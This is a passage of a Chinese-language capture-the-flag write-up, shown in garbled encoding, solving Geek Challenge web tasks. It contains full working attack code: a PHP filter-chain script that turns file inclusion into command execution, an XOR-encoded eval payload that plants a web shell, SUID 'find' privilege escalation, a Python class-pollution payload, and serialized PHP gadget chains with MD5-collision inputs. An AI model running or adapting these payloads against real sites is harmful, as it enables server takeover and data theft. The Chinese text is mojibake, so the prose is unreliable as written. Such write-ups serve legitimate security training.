&#x27;nMa3orDC2e|sso43vzOmv|3cLxYQjVCU|bfcsVjUjUc|DGUxICjb62|4agL09NVrj|vCY0Ii09gS|KEC5rjXegm|14Bl45OsHh|zgbN7myZbJ|Q67hx4uRVf|E4SQRpukkv|31A7kBmcpB|3J5Pj4Yfeb|zXfWAa86o5|5KMdsa0Uo0|btCM1eO8wo|maZNliuB1R|Y836Rhmpca|YreAYs4dbp|uK4nhxkdkw|4utkLM9gE7|TYekFoXTXJ|JSP6Hx0vyI|kzjZoBiv9R|EtQZUROvnh|HcTSaxtIXF|GmQhLWWoQ7|3PefcQupE7|Ctbc67MqB4|U55i5C09vA|ZqeKQ6yJSV|ufP5AUtnC6|yiYrEYIAgg|mHwm6SFE0K|q8PwOK5E2U|kBwsskBu0h|AlYCggPR8d|25Lmp0TH9E|2VDW4pida7|&#x27;.split(&#x27;|&#x27;)[:-1]url=&#x27;https://s5bwqhfkrgtcnancf0t3vxkgq.node.game.sycsec.com/upload/&#x27;for i in range(len(rand)): u = url + rand[i] + &#x27;.php&#x27; r=requests.get(u) if r.status_code == 200: print(u) break è®¿é—®å³å¯å¾—flagã€‚ â€‹ ezrfi äº²çˆ±çš„Syclover,ä½ èƒ½æ‰¾åˆ°flagå—???? åªèƒ½è¯»pyæ–‡ä»¶ï¼Œè¯•å‡º ?file=/var/hint secret=&quot;w5YubyBvd08gMHcwIG92MCDDlndvIE8ubyAwLjAgMC5vIMOWdjAgMHbDliBPdjAgT3fDliBvLk8gw5Z2TyAwXzAgMF9PIG8uTyAwdjAgw5ZfbyBPd28gw5Z2TyDDli5PIMOWXzAgTy5PIMOWXzAgMHbDliAwLjAgw5Z2w5Ygw5Z3MCBPdsOWIMOWdjAgT1/DliDDlnZPIMOWLk8gw5Z3MCBvd8OWIMOWLm8gTy5vIMOWXzAgMHbDliDDlndvIE93w5YgTy5vIE93TyBvX28gw5YuTyBvLm8gb3dPIMOWXzAgb3dPIMOWXzAgMHZvIG8uTyBPd8OWIE92byAwLsOWIMOWdjAgTy7DliAwLjAgMHfDliBvLsOWIG93byBvdzAgMHZvIMOWLm8gb3dPIG9fMCDDli5PIG9fbyBPd8OWIE8ubyBvdzAgw5ZfbyBvd28gw5YuMCDDlnZPIG9fTyBPLsOWIE92MCBPdzAgby7DliAwdjAgT3YwIE9fTyBvLk8gT3bDliDDlnYwIMOWXzAgw5Z3byBvd08gT19vIE93w5Ygby5PIMOWdk8gby4wIDBfMCDDll9vIG93TyBPXzAgMC7DliDDli5vIE8uTyBPdzAgT19vIMOWdjAgb3cwIMOWdjAgT18wIMOWdm8gw5Z2w5Ygw5ZfbyAwX8OWIMOWdm8gw5Z2w5YgMHcwIE92w5Ygw5YubyDDli4wIMOWLm8gb3ZvIMOWLjAgw5YuMCAwd28gb3dPIG8uTyAwd8OWIDB2MCBvd8OWIMOWdzAgw5YubyAwdzAgT1/DliBvX08gw5Z2byAg&quot; base64è§£å¯†å¾—ï¼š Ã–.o owO 0w0 ov0 Ã–wo O.o 0.0 0.o Ã–v0 0vÃ– Ov0 OwÃ– o.O Ã–vO 0_0 0_O o.O 0v0 Ã–_o Owo Ã–vO Ã–.O Ã–_0 O.O Ã–_0 0vÃ– 0.0 Ã–vÃ– Ã–w0 OvÃ– Ã–v0 O_Ã– Ã–vO Ã–.O Ã–w0 owÃ– Ã–.o O.o Ã–_0 0vÃ– Ã–wo OwÃ– O.o OwO o_o Ã–.O o.o owO Ã–_0 owO Ã–_0 0vo o.O OwÃ– Ovo 0.Ã– Ã–v0 O.Ã– 0.0 0wÃ– o.Ã– owo ow0 0vo Ã–.o owO o_0 Ã–.O o_o OwÃ– O.o ow0 Ã–_o owo Ã–.0 Ã–vO o_O O.Ã– Ov0 Ow0 o.Ã– 0v0 Ov0 O_O o.O OvÃ– Ã–v0 Ã–_0 Ã–wo owO O_o OwÃ– o.O Ã–vO o.0 0_0 Ã–_o owO O_0 0.Ã– Ã–.o O.O Ow0 O_o Ã–v0 ow0 Ã–v0 O_0 Ã–vo Ã–vÃ– Ã–_o 0_Ã– Ã–vo Ã–vÃ– 0w0 OvÃ– Ã–.o Ã–.0 Ã–.o ovo Ã–.0 Ã–.0 0wo owO o.O 0wÃ– 0v0 owÃ– Ã–w0 Ã–.o 0w0 O_Ã– o_O Ã–vo å°Šå˜Ÿå‡å˜Ÿè§£ç ï¼š Shy0JhFpsi+njV0IfFfzS44KIcwPFg312qo6gfdk0+DzcoMdSgVs15cERxpqnPJh4Y3b3i/mcbkPlHGTIA6/A8CQU8UX6j9w5HKy æ ¹æ®æç¤ºRC4è§£ç ï¼Œkey=Sycloverï¼Œå¾—ï¼š æ–‡ä»¶åŒ…å«é€»è¾‘æ˜¯include($file.&quot;.py&quot;),ä½ èƒ½æ‰¾åˆ°flagæ–‡ä»¶ä½ç½®å—?? å‚è€ƒï¼š LFI æ–°å§¿åŠ¿å­¦ä¹ ï¼Œä½¿ç”¨æ–‡ä»¶åŒ…å«RCEï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758import requestsurl = &quot;http://bhhtut26mxsa9f29ft8jg5y5p.node.game.sycsec.com/index.php&quot;file_to_use = &quot;/var/hint&quot;command = &quot;cat /ffffffllllag&quot;#&lt;?=`$_GET[0]`;;?&gt;base64_payload = &quot;PD89YCRfR0VUWzBdYDs7Pz4&quot;conversions = &#123; &#x27;R&#x27;: &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2&#x27;, &#x27;B&#x27;: &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2&#x27;, &#x27;C&#x27;: &#x27;convert.iconv.UTF8.CSISO2022KR&#x27;, &#x27;8&#x27;: &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#x27;, &#x27;9&#x27;: &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB&#x27;, &#x27;f&#x27;: &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213&#x27;, &#x27;s&#x27;: &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61&#x27;, &#x27;z&#x27;: &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS&#x27;, &#x27;U&#x27;: &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932&#x27;, &#x27;P&#x27;: &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213&#x27;, &#x27;V&#x27;: &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5&#x27;, &#x27;0&#x27;: &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2&#x27;, &#x27;Y&#x27;: &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2&#x27;, &#x27;W&#x27;: &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2&#x27;, &#x27;d&#x27;: &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2&#x27;, &#x27;D&#x27;: &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2&#x27;, &#x27;7&#x27;: &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2&#x27;, &#x27;4&#x27;: &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2&#x27;&#125;# generate some garbage base64filters = &quot;convert.iconv.UTF8.CSISO2022KR|&quot;filters += &quot;convert.base64-encode|&quot;# make sure to get rid of any equal signs in both the string we just generated and the rest of the filefilters += &quot;convert.iconv.UTF8.UTF7|&quot;for c in base64_payload[::-1]: filters += conversions[c] + &quot;|&quot; # decode and reencode to get rid of everything that isn&#x27;t valid base64 filters += &quot;convert.base64-decode|&quot; filters += &quot;convert.base64-encode|&quot; # get rid of equal signs filters += &quot;convert.iconv.UTF8.UTF7|&quot;filters += &quot;convert.base64-decode&quot;final_payload = f&quot;php://filter/&#123;filters&#125;/resource=&#123;file_to_use&#125;&quot;r = requests.get(url, params=&#123; &quot;0&quot;: command, &quot;file&quot;: final_payload&#125;)print(r.text)# SYC&#123;The PhpFFffilter 0n File-include vulnerabilities is s0 Amazing!!#@##&#125; â€‹ EzRce can you rce me??? flagä¸­ç©ºæ ¼è¯·ç”¨ä¸‹åˆ’çº¿æ›¿ä»£ 123456789101112&lt;?phpinclude(&#x27;waf.php&#x27;);session_start();show_source(__FILE__);error_reporting(0);$data=$_GET[&#x27;data&#x27;];if(waf($data))&#123; eval($data);&#125;else&#123; echo &quot;no!&quot;;&#125;?&gt; ç›²è¯•wafï¼Œä¸ºæ— å­—æ¯æ•°å­—RCEï¼Œå¼‚æˆ–å¯ç”¨ï¼Œå°†æ¯ä¸ªå­—ç¬¦å¼‚æˆ– %A0 å¾—åˆ°ä¸å¯è§å­—ç¬¦ã€‚ phpinfo();ï¼š ?data=(%A0%A0%A0%A0%A0%A0%A0^%D0%C8%D0%C9%CE%C6%CF)(); çœ‹åˆ°disable_functionç¦ç”¨äº†ï¼š exec,system,fwrite,passthru,popen,shell_exec,error_log,fputs,file_get_contents,assert,call_user_func,call_user_func_array,array_map,array_filter,array_reduce,get_defined_vars,getallheaders è¯»waf - readgzfile(&#39;waf.php&#39;);ï¼š ?data=(%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0^%D2%C5%C1%C4%C7%DA%C6%C9%CC%C5)(%A0%A0%A0%A0%A0%A0%A0^%D7%C1%C6%8E%D0%C8%D0); waf.php 123456789&lt;?phpfunction waf($data)&#123; if(preg_match(&#x27;/[b-df-km-uw-z0-9\\+\\~\\&#123;\\&#125;]+/i&#x27;,$data))&#123; return False; &#125;else&#123; return True; &#125;&#125; å†™é©¬ - file_put_contents(&#39;2.php&#39;,&#39;&lt;?php eval($_POST[1]);&#39;);ï¼š ?data=(%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0^%C6%C9%CC%C5%FF%D0%D5%D4%FF%C3%CF%CE%D4%C5%CE%D4%D3)((%A0%A0%A0%A0%A0^%92%8E%D0%C8%D0),(%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0^%9C%9F%D0%C8%D0%80%C5%D6%C1%CC%88%84%FF%F0%EF%F3%F4%FB%91%FD%89%9B)); èšå‰‘è¿æ¥ï¼Œfind / -perm -u=s -type f 2&gt;/dev/null å‘ç° /usr/bin/find æœ‰ SUIDæƒé™ï¼Œ findææƒï¼š 123cd /tmptouch abcdfind abcd -exec cat /flag \\; å¾—flagï¼šSYC&#123;ThE_RCe is S0 Eas1ly_DD!&#125; â€‹ ezpython can you pollute me? 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102import jsonimport osfrom waf import wafimport importlibfrom flask import Flask,render_template,request,redirect,url_for,session,render_template_stringapp = Flask(__name__)app.secret_key=&#x27;jjjjggggggreekchallenge202333333&#x27;class User(): def __init__(self): self.username=&quot;&quot; self.password=&quot;&quot; self.isvip=Falseclass hhh(User): def __init__(self): self.username=&quot;&quot; self.password=&quot;&quot;registered_users=[]@app.route(&#x27;/&#x27;)def hello_world(): # put application&#x27;s code here return render_template(&quot;welcome.html&quot;)@app.route(&#x27;/play&#x27;)def play(): username=session.get(&#x27;username&#x27;) if username: return render_template(&#x27;index.html&#x27;,name=username) else: return redirect(url_for(&#x27;login&#x27;))@app.route(&#x27;/login&#x27;,methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])def login(): if request.method == &#x27;POST&#x27;: username=request.form.get(&#x27;username&#x27;) password=request.form.get(&#x27;password&#x27;) user = next((user for user in registered_users if user.username == username and user.password == password), None) if user: session[&#x27;username&#x27;] = user.username session[&#x27;password&#x27;]=user.password return redirect(url_for(&#x27;play&#x27;)) else: return &quot;Invalid login&quot; return redirect(url_for(&#x27;play&#x27;)) return render_template(&quot;login.html&quot;)@app.route(&#x27;/register&#x27;,methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])def register(): if request.method == &#x27;POST&#x27;: try: if waf(request.data): return &quot;fuck payload!Hacker!!!&quot; data=json.loads(request.data) if &quot;username&quot; not in data or &quot;password&quot; not in data: return &quot;è¿ç”¨æˆ·åå¯†ç éƒ½æ²¡æœ‰ä½ æ³¨å†Œå•¥å‘¢&quot; user=hhh() merge(data,user) registered_users.append(user) except Exception as e: return &quot;æ³°é…·è¾£,æ²¡æœ‰æ³¨å†ŒæˆåŠŸæ&quot; return redirect(url_for(&#x27;login&#x27;)) else: return render_template(&quot;register.html&quot;)@app.route(&#x27;/flag&#x27;,methods=[&#x27;GET&#x27;])def flag(): user = next((user for user in registered_users if user.username ==session[&#x27;username&#x27;] and user.password == session[&#x27;password&#x27;]), None) if user: if user.isvip: data=request.args.get(&#x27;num&#x27;) if data: if &#x27;0&#x27; not in data and data != &quot;123456789&quot; and int(data) == 123456789 and len(data) &lt;=10: flag = os.environ.get(&#x27;geek_flag&#x27;) return render_template(&#x27;flag.html&#x27;,flag=flag) else: return &quot;ä½ çš„æ•°å­—ä¸å¯¹å“¦!&quot; else: return &quot;I need a num!!!&quot; else: return render_template_string(&#x27;è¿™ç§ç¥åŠŸä½ ä¸å……VIPä¹Ÿæƒ³å­¦?&lt;p&gt;&lt;img src=&quot;&#123;&#123;url_for(\\&#x27;static\\&#x27;,filename=\\&#x27;weixin.png\\&#x27;)&#125;&#125;&quot;&gt;è¦ä¸væˆ‘50,æˆ‘é€ä½ ä¸€ä¸ªVIPå§,å˜»å˜»&lt;/p&gt;&#x27;) else: return &quot;å…ˆç™»å½•å»&quot;def merge(src, dst): for k, v in src.items(): if hasattr(dst, &#x27;__getitem__&#x27;): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v)if __name__ == &#x27;__main__&#x27;: app.run(host=&quot;0.0.0.0&quot;,port=&quot;8888&quot;) ä»£ç ä¸­æœ‰ merge() å‡½æ•°ï¼Œå‚è€ƒï¼šPythonåŸå‹é“¾æ±¡æŸ“å˜ä½“(prototype-pollution-in-python) wafä¸­åŒ…å« isvipï¼Œä½¿ç”¨Unicodeç¼–ç ç»•è¿‡å…³é”®å­—è¿‡æ»¤ã€‚ å¯¹è·¯ç”± /registerï¼ŒPOST &#123;&quot;username&quot;:&quot;xx&quot;,&quot;password&quot;:&quot;yy&quot;,&quot;__class__&quot; : &#123;&quot;__base__&quot; : &#123;&quot;is\\u0076ip&quot; : 1&#125;&#125;&#125; å†ç™»å½•è®¿é—® /flagï¼Œç”¨ + ç»•è¿‡åˆ¤æ–­ï¼š/flag?num=+123456789ï¼ŒæŸ¥çœ‹æºç å¾—åˆ°flagã€‚ â€‹ ez_php æˆ‘çš„å¥³ç¥å‘¢ï¼Ÿå¿«å¸®æˆ‘æ‰¾æ‰¾ æºç åœ¨ havefun.phpï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129&lt;?phpheader(&quot;Content-type:text/html;charset=utf-8&quot;); error_reporting(0);show_source(__FILE__);include(&#x27;key.php&#x27;);include(&#x27;waf.php&#x27;);class Me &#123; public $qwe; public $bro; public $secret; public function __wakeup() &#123; echo(&quot;è¿›æ¥å•¦&lt;br&gt;&quot;); $characters = &#x27;abcdefghijklmnopqrstuvwxyz0123456789&#x27;; $randomString = substr(str_shuffle($characters), 0, 6); $this-&gt;secret=$randomString; if($this-&gt;bro===$this-&gt;secret)&#123; $bb = $this-&gt;qwe; return $bb(); &#125; else&#123; echo(&quot;é”™äº†å“¥ä»¬,å†è¯•è¯•å§&lt;br&gt;&quot;); &#125; &#125;&#125;class her&#123; private $hername; private $key; public $asd; public function __invoke() &#123; echo(&quot;å¥½ç´¯ï¼Œå¥½æƒ³ç¡ä¸€è§‰å•Š&lt;br&gt;&quot;); serialize($this-&gt;asd); &#125; public function find() &#123; echo(&quot;ä½ èƒ½æ‰¾åˆ°åŠ å¯†ç”¨çš„keyå’Œå¥¹çš„åå­—å—ï¼Ÿqwq&lt;br&gt;&quot;); if (encode($this-&gt;hername,$this-&gt;key) === &#x27;vxvx&#x27;) &#123; echo(&quot;è§£å¯†æˆåŠŸï¼&lt;br&gt;&quot;); $file=$_GET[&#x27;file&#x27;]; if (isset($file) &amp;&amp; (file_get_contents($file,&#x27;r&#x27;) === &quot;loveyou&quot;)) &#123; echo(&quot;å¿«ç‚¹çš„ï¼Œæ€¥æ€¥æ€¥ï¼ï¼ï¼&lt;br&gt;&quot;); echo new $_POST[&#x27;ctf&#x27;]($_GET[&#x27;fun&#x27;]); &#125; else&#123; echo(&quot;çœŸçš„åªå·®ä¸€æ­¥äº†ï¼&lt;br&gt;&quot;); &#125; &#125; else&#123; echo(&quot;å…„å¼Ÿæ€ä¹ˆæçš„ï¼Ÿ&lt;br&gt;&quot;); &#125; &#125;&#125;class important&#123; public $power; public function __sleep() &#123; echo(&quot;ç¡é¥±äº†ï¼Œæ¥ç€æ‰¾ï¼&lt;br&gt;&quot;); return $this-&gt;power-&gt;seeyou; &#125;&#125;class useless &#123; private $seeyou; public $QW; public $YXX; public function __construct($seeyou) &#123; $this-&gt;seeyou = $seeyou; &#125; public function __destruct() &#123; $characters = &#x27;0123456789&#x27;; $random = substr(str_shuffle($characters), 0, 6); if (!preg_match(&#x27;/key\\.php\\/*$/i&#x27;, $_SERVER[&#x27;REQUEST_URI&#x27;]))&#123; if((strlen($this-&gt;QW))&lt;80 &amp;&amp; strlen($this-&gt;YXX)&lt;80)&#123; $bool=!is_array($this-&gt;QW)&amp;&amp;!is_array($this-&gt;YXX)&amp;&amp;(md5($this-&gt;QW) === md5($this-&gt;YXX)) &amp;&amp; ($this-&gt;QW != $this-&gt;YXX) and $random===&#x27;newbee&#x27;; if($bool)&#123; echo(&quot;å¿«æ‹¿åˆ°æˆ‘çš„å°ç§˜å¯†äº†&lt;br&gt;&quot;); $a = isset($_GET[&#x27;a&#x27;])? $_GET[&#x27;a&#x27;]: &quot;&quot; ; if(!preg_match(&#x27;/HTTP/i&#x27;, $a))&#123; echo (basename($_SERVER[$a])); echo (&#x27;&lt;br&gt;&#x27;); if(basename($_SERVER[$a])===&#x27;key.php&#x27;)&#123; echo(&quot;æ‰¾åˆ°äº†ï¼ä½†å¥½åƒä¸èƒ½ç›´æ¥ä½¿ç”¨ï¼Œæ€ä¹ˆåŠï¼Œæˆ‘å¥½æƒ³å¥¹&lt;br&gt;&quot;); $file = &quot;key.php&quot;; readfile($file); &#125; &#125; else&#123; echo(&quot;ä½ åˆ«è¿™æ ·ï¼Œå¥¹ä¼šç”Ÿæ°”çš„â”­â”®ï¹â”­â”®&quot;); &#125; &#125; &#125; else&#123; echo(&quot;å°±è¿™ç‚¹èƒ½è€ï¼Ÿæ€ä¹ˆå¸®æˆ‘æ‰¾åˆ°å¥¹(â•¥â•¯^â•°â•¥)&lt;br&gt;&quot;); &#125; &#125; &#125; public function __get($good) &#123; echo &quot;you are good,ä½ å¿«æ‰¾åˆ°æˆ‘çˆ±çš„é‚£ä¸ªå¥¹äº†&lt;br&gt;&quot;; $zhui = $this-&gt;$good; $zhui[$good](); &#125;&#125;if (isset($_GET[&#x27;user&#x27;])) &#123; $user = $_GET[&#x27;user&#x27;]; if (!preg_match(&quot;/^[Oa]:[\\d]+/i&quot;, $user)) &#123; unserialize($user); &#125; else &#123; echo(&quot;ä¸æ˜¯å§ï¼Œç¬¬ä¸€å±‚éƒ½ç»•ä¸è¿‡å»ï¼Ÿï¼Ÿï¼Ÿ&lt;br&gt;&quot;); &#125;&#125;else &#123; echo(&quot;å¿«å¸®æˆ‘æ‰¾æ‰¾å¥¹ï¼&lt;br&gt;&quot;);&#125;?&gt; å…ˆååºåˆ—åŒ– useless ç±»çš„ __destruct() æ‹¿åˆ° key.phpï¼š ç”¨ ArrayObject ç»•è¿‡ /^[Oa]:[\\d]+/iï¼Œmd5ç¢°æ’ï¼Œå†æ ¹æ® and çš„ä¼˜å…ˆçº§æ— è§† $randomï¼š C:11:&quot;ArrayObject&quot;:196:&#123;x:i:0;O:7:&quot;useless&quot;:2:&#123;s:2:&quot;QW&quot;;s:64:&quot;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&quot;;s:3:&quot;YXX&quot;;s:64:&quot;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2&quot;;&#125;;m:a:0:&#123;&#125;&#125; basename() ç»•è¿‡ $_SERVER[&#39;PHP_SELF&#39;]ï¼š /havefun.php/key.php?user=C:11:%22ArrayObject%22:196:&#123;x:i:0;O:7:%22useless%22:2:&#123;s:2:%22QW%22;s:64:%22M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2%22;s:3:%22YXX%22;s:64:%22M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2%22;&#125;;m:a:0:&#123;&#125;&#125;&amp;a=PHP_SELF å¾—åˆ°å›¾ç‰‡ï¼Œä¿¡æ¯æ˜¯ key=9ï¼š æœ€åå†æ¥ä¸€æ¬¡ååºåˆ—åŒ–é“¾è°ƒç”¨ï¼š 12345Me:__wakeup() ï¼ˆå¼•ç”¨ï¼‰her:__invoke()important:__sleep()useless:__get()her:find() 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?phpclass Me &#123; public $qwe; public $bro; public $secret; public function __construct()&#123; $this-&gt;qwe = new her; $this-&gt;bro = &amp;$this-&gt;secret; &#125;&#125;class her&#123; private $hername; private $key; public $asd; public function __construct()&#123; $this-&gt;asd = new important; &#125;&#125;class important&#123; public $power; public function __construct()&#123; $this-&gt;power = new useless; &#125;&#125;class useless &#123; private $seeyou; public $QW; public $YXX; public function __construct() &#123; $this-&gt;seeyou = array(&#x27;seeyou&#x27;=&gt;array(new hez,&#x27;find&#x27;)); &#125;&#125;class hez&#123; private $hername; private $key; public $asd; public function __construct()&#123; $this-&gt;hername = &#x27;momo&#x27;; $this-&gt;key = &#x27;9&#x27;; &#125;&#125;$a=new Me;echo urlencode(serialize($a)); phpinfo()ï¼Œä¿®æ”¹å¼•ç”¨11ä¸º13ï¼š C:11:%22ArrayObject%22:260:&#123;x:i:0;O%3A2%3A%22Me%22%3A3%3A%7Bs%3A3%3A%22qwe%22%3BO%3A3%3A%22her%22%3A3%3A%7Bs%3A12%3A%22%00her%00hername%22%3BN%3Bs%3A8%3A%22%00her%00key%22%3BN%3Bs%3A3%3A%22asd%22%3BO%3A9%3A%22important%22%3A1%3A%7Bs%3A5%3A%22power%22%3BO%3A7%3A%22useless%22%3A3%3A%7Bs%3A15%3A%22%00useless%00seeyou%22%3Ba%3A1%3A%7Bs%3A6%3A%22seeyou%22%3Bs%3A7%3A%22phpinfo%22%3B%7Ds%3A2%3A%22QW%22%3BN%3Bs%3A3%3A%22YXX%22%3BN%3B%7D%7D%7Ds%3A3%3A%22bro%22%3BN%3Bs%3A6%3A%22secret%22%3BR%3A13%3B%7D;m:a:0:&#123;&#125;&#125; ä¿®æ”¹å¼•ç”¨16ä¸º18ï¼Œæ”¹hezä¸ºherï¼š C:11:%22ArrayObject%22:351:&#123;x:i:0;O%3A2%3A%22Me%22%3A3%3A%7Bs%3A3%3A%22qwe%22%3BO%3A3%3A%22her%22%3A3%3A%7Bs%3A12%3A%22%00her%00hername%22%3BN%3Bs%3A8%3A%22%00her%00key%22%3BN%3Bs%3A3%3A%22asd%22%3BO%3A9%3A%22important%22%3A1%3A%7Bs%3A5%3A%22power%22%3BO%3A7%3A%22useless%22%3A3%3A%7Bs%3A15%3A%22%00useless%00seeyou%22%3Ba%3A1%3A%7Bs%3A6%3A%22seeyou%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A3%3A%22her%22%3A3%3A%7Bs%3A12%3A%22%00her%00hername%22%3Bs%3A4%3A%22momo%22%3Bs%3A8%3A%22%00her%00key%22%3Bs%3A1%3A%229%22%3Bs%3A3%3A%22asd%22%3BN%3B%7Di%3A1%3Bs%3A4%3A%22find%22%3B%7D%7Ds%3A2%3A%22QW%22%3BN%3Bs%3A3%3A%22YXX%22%3BN%3B%7D%7D%7Ds%3A3%3A%22bro%22%3BN%3Bs%3A6%3A%22secret%22%3BR%3A18%3B%7D;m:a:0:&#123;&#125;&#125; æœ€ç»ˆpayloadï¼Œåˆ—ç›®å½•ï¼š ?user=C:11:%22ArrayObject%22:351:&#123;x:i:0;O%3A2%3A%22Me%22%3A3%3A%7Bs%3A3%3A%22qwe%22%3BO%3A3%3A%22her%22%3A3%3A%7Bs%3A12%3A%22%00her%00hername%22%3BN%3Bs%3A8%3A%22%00her%00key%22%3BN%3Bs%3A3%3A%22asd%22%3BO%3A9%3A%22important%22%3A1%3A%7Bs%3A5%3A%22power%22%3BO%3A7%3A%22useless%22%3A3%3A%7Bs%3A15%3A%22%00useless%00seeyou%22%3Ba%3A1%3A%7Bs%3A6%3A%22seeyou%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A3%3A%22her%22%3A3%3A%7Bs%3A12%3A%22%00her%00hername%22%3Bs%3A4%3A%22momo%22%3Bs%3A8%3A%22%00her%00key%22%3Bs%3A1%3A%229%22%3Bs%3A3%3A%22asd%22%3BN%3B%7Di%3A1%3Bs%3A4%3A%22find%22%3B%7D%7Ds%3A2%3A%22QW%22%3BN%3Bs%3A3%3A%22YXX%22%3BN%3B%7D%7D%7Ds%3A3%3A%22bro%22%3BN%3Bs%3A6%3A%22secret%22%3BR%3A18%3B%7D;m:a:0:&#123;&#125;&#125;&amp;file=data://text/plain,loveyou&amp;fun=glob://f* POST: ctf=DirectoryIterator å¾—åˆ°flagæ–‡ä»¶åä¸º flag_my_baby.phpã€‚ å†è¯»flagæ–‡ä»¶ï¼š ?user=C:11:%22ArrayObject%22:351:&#123;x:i:0;O%3A2%3A%22Me%22%3A3%3A%7Bs%3A3%3A%22qwe%22%3BO%3A3%3A%22her%22%3A3%3A%7Bs%3A12%3A%22%00her%00hername%22%3BN%3Bs%3A8%3A%22%00her%00key%22%3BN%3Bs%3A3%3A%22asd%22%3BO%3A9%3A%22important%22%3A1%3A%7Bs%3A5%3A%22power%22%3BO%3A7%3A%22useless%22%3A3%3A%7Bs%3A15%3A%22%00useless%00seeyou%22%3Ba%3A1%3A%7Bs%3A6%3A%22seeyou%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A3%3A%22her%22%3A3%3A%7Bs%3A12%3A%22%00her%00hername%22%3Bs%3A4%3A%22momo%22%3Bs%3A8%3A%22%00her%00key%22%3Bs%3A1%3A%229%22%3Bs%3A3%3A%22asd%22%3BN%3B%7Di%3A1%3Bs%3A4%3A%22find%22%3B%7D%7Ds%3A2%3A%22QW%22%3BN%3Bs%3A3%3A%22YXX%22%3BN%3B%7D%7D%7Ds%3A3%3A%22bro%22%3BN%3Bs%3A6%3A%22secret%22%3BR%3A18%3B%7D;m:a:0:&#123;&#125;&#125;&amp;file=data://text/plain,loveyou&amp;fun=php://filter/convert.base64-encode/resource=flag_my_baby.php POST: ctf=SplFileObject ç»“æœbase64è§£ç å³å¾—flagã€‚ â€‹ scan_tool nmapä¹Ÿå¤ªå¥½ç”¨äº†ï¼ä¸æ˜¯å§ï¼Œä½ 